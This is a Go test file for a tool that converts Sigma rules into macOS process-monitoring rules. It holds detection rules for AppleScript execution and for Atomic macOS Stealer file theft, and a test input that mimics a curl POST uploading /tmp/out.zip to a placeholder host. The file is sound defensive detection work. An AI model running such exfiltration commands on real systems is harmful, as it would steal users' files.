package sigma

import (
	"strings"
	"testing"
	"time"

	"github.com/echtermeyer/overlord/internal/events"
	"github.com/echtermeyer/overlord/internal/graph"
	"github.com/echtermeyer/overlord/internal/rules"
)

const applescript = `
title: MacOS Scripting Interpreter AppleScript
id: 1bc2e6c5-0885-472b-bed6-be5ea8eace55
description: Detects execution of AppleScript.
tags: [attack.execution, attack.t1059.002]
logsource:
    category: process_creation
    product: macos
detection:
    selection:
        Image|endswith: '/osascript'
        CommandLine|contains:
            - ' -e '
            - '.scpt'
            - '.js'
    filter_optional_opencode:
        ParentImage|endswith: 'opencode'
        CommandLine|contains|all:
            - 'osascript'
            - ' -e '
    condition: selection and not 1 of filter_optional_*
level: medium
`

const amos = `
title: Atomic MacOS Stealer - FileGrabber Activity
logsource:
    category: process_creation
    product: macos
detection:
    selection_curl_post:
        CommandLine|contains|all:
            - 'curl'
            - 'user:'
            - 'BuildID'
            - 'file=@/tmp/out.zip'
    selection_filegrabber_exec:
        CommandLine|contains|all:
            - 'FileGrabber'
            - '/tmp'
    condition: 1 of selection_*
level: high
`

type ctx struct{}

func (ctx) Reads(string, time.Duration) []graph.Read        { return nil }
func (ctx) Outbound(string, time.Duration) []graph.Dest     { return nil }
func (ctx) SessionReads(string, time.Duration) []graph.Read { return nil }
func (ctx) InAllowlist(string, string) bool                 { return false }
func (ctx) Category(string) string                          { return "" }

func engine(t *testing.T, raw string) (*rules.Engine, rules.Rule) {
	t.Helper()
	r, err := Convert([]byte(raw))
	if err != nil {
		t.Fatal(err)
	}
	e, err := rules.New(ctx{}, []rules.Rule{r}, rules.Policy{DefaultStage: rules.Enforce}, 0)
	if err != nil {
		t.Fatalf("%s: %v\n%s", r.ID, err, r.When)
	}
	return e, r
}

func exec(parent, path string, args ...string) rules.Input {
	p := &graph.Node{Key: "1:1", Process: events.Process{PID: 1, Path: parent}, Tags: map[string]string{}}
	target := &graph.Node{Key: "1:2", Process: events.Process{PID: 1, Path: path, Args: append([]string{path}, args...)}, Tags: map[string]string{}}
	return rules.Input{Event: &events.Event{Kind: events.Exec}, Process: p, Target: target}
}

func TestAppleScript(t *testing.T) {
	e, r := engine(t, applescript)
	if r.ID != "sigma.macos-scripting-interpreter-applescript" || r.Confidence != rules.Possible || r.On[0] != events.Exec {
		t.Errorf("%+v", r)
	}
	hit, _ := e.Evaluate(exec("/bin/zsh", "/usr/bin/osascript", "-e", "tell application \"Finder\""))
	if len(hit) != 1 {
		t.Errorf("osascript -e did not fire: %s", r.When)
	}
	e2, _ := engine(t, applescript)
	miss, _ := e2.Evaluate(exec("/opt/opencode", "/usr/bin/osascript", "-e", "x"))
	if len(miss) != 0 {
		t.Error("filter not applied")
	}
	e3, _ := engine(t, applescript)
	miss, _ = e3.Evaluate(exec("/bin/zsh", "/usr/bin/osascript", "script.applescript"))
	if len(miss) != 0 {
		t.Error("fired without -e or script suffix")
	}
}

func TestAMOS(t *testing.T) {
	e, r := engine(t, amos)
	if r.Confidence != rules.Likely {
		t.Errorf("level high should be likely: %+v", r)
	}
	hit, _ := e.Evaluate(exec("/bin/sh", "/usr/bin/curl", "-X", "POST", "-H", "user: x", "-H", "BuildID: 1", "-F", "file=@/tmp/out.zip", "http://x"))
	if len(hit) != 1 {
		t.Errorf("curl post did not fire: %s", r.When)
	}
	e2, _ := engine(t, amos)
	hit, _ = e2.Evaluate(exec("/bin/sh", "/tmp/FileGrabber", "/tmp"))
	if len(hit) != 1 {
		t.Error("filegrabber did not fire")
	}
}

func TestWildcardsAndRejections(t *testing.T) {
	raw := `
title: Wild
logsource: {category: process_creation, product: macos}
detection:
    selection:
        Image: '*/Contents/MacOS/*'
        CommandLine|contains: 'ab?'
    condition: selection
level: low
`
	e, r := engine(t, raw)
	if !strings.Contains(r.When, `target.path.matches("^.*/Contents/MacOS/.*$")`) || !strings.Contains(r.When, `target.cmdline.matches("ab.")`) {
		t.Errorf("%s", r.When)
	}
	if hit, _ := e.Evaluate(exec("/x", "/Applications/A.app/Contents/MacOS/A", "abc")); len(hit) != 1 {
		t.Error("abc did not fire")
	}
	for _, bad := range []string{
		"title: w\nlogsource: {category: process_creation, product: windows}\ndetection:\n  selection: {Image: x}\n  condition: selection\n",
		"title: n\nlogsource: {category: network_connection, product: macos}\ndetection:\n  selection: {Image: x}\n  condition: selection\n",
		"title: f\nlogsource: {category: process_creation, product: macos}\ndetection:\n  selection: {Hashes: x}\n  condition: selection\n",
		"title: c\nlogsource: {category: process_creation, product: macos}\ndetection:\n  selection: {Image: x}\n  condition: selection and nothing\n",
		"title: m\nlogsource: {category: process_creation, product: macos}\ndetection:\n  selection: {'Image|base64': x}\n  condition: selection\n",
	} {
		if _, err := Convert([]byte(bad)); err == nil {
			t.Errorf("accepted: %s", bad)
		}
	}
}
